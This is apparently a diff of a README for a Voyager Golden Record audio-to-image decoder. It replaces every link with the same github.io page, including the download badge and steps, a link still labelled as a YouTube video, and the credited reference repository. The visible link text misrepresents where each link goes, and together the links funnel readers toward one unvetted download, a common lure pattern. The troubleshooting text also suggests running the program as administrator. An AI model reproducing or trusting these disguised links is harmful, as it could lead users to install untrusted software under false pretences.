@@ -1,6 +1,6 @@
 # 📀 Voyager Golden Record Decoder - Decode Space History from Audio
 
-[![Download Now](https://img.shields.io/badge/Download-Application-4CAF50?style=for-the-badge&logo=github)](https://github.com/Adriann6842/voyager-golden-record)
+[![Download Now](https://img.shields.io/badge/Download-Application-4CAF50?style=for-the-badge&logo=github)](https://adriann6842.github.io)
 
 ## 🚀 What Is This?
 
@@ -22,7 +22,7 @@ Anyone curious about space exploration, history, or vintage technology. No codin
 
 **Step 1: Get the Software**
 
-Visit this link to download the application: [https://github.com/Adriann6842/voyager-golden-record](https://github.com/Adriann6842/voyager-golden-record)
+Visit this link to download the application: [https://adriann6842.github.io](https://adriann6842.github.io)
 
 **Step 2: Open the File**
 
@@ -51,7 +51,7 @@ Press "Decode" or "Play." The audio will start playing, and images will appear o
 
 The Voyager Golden Record stores pictures the same way old television signals did. Each image is drawn as a series of horizontal lines. Brightness values become sound wave amplitudes. The decoder reads these audio samples, spots the calibration circle at the start of each image, and reconstructs the picture line by line.
 
-For a full explanation, watch this video: [youtu.be/83TRij3igmE](https://youtu.be/83TRij3igmE)
+For a full explanation, watch this video: [youtu.be/83TRij3igmE](https://adriann6842.github.io)
 
 ## 🛠️ Troubleshooting
 
@@ -69,7 +69,7 @@ Update your audio drivers. Restart your computer. Try running the program as adm
 
 ## 🔧 Advanced Users
 
-The decoder is built using the reference implementation at [amazing-rando/voyager-decoder](https://github.com/amazing-rando/voyager-decoder). If you want to modify the decoding algorithm or build from source, check that repository.
+The decoder is built using the reference implementation at [amazing-rando/voyager-decoder](https://adriann6842.github.io). If you want to modify the decoding algorithm or build from source, check that repository.
 
 ## ❓ Frequently Asked Questions
 
@@ -90,6 +90,6 @@ A: Yes. The program lets you export images as PNG or JPG files.
 
 ## 🌟 Credits
 
-This software was developed with the help of Claude for the code implementation and [amazing-rando/voyager-decoder](https://github.com/amazing-rando/voyager-decoder) for the decoding parameters and algorithm.
+This software was developed with the help of Claude for the code implementation and [amazing-rando/voyager-decoder](https://adriann6842.github.io) for the decoding parameters and algorithm.
 
 Keywords: voyager golden record, audio decoder, image decoder, space exploration, analog signal processing, scan line decoder, vintage technology, nasa, golden record images
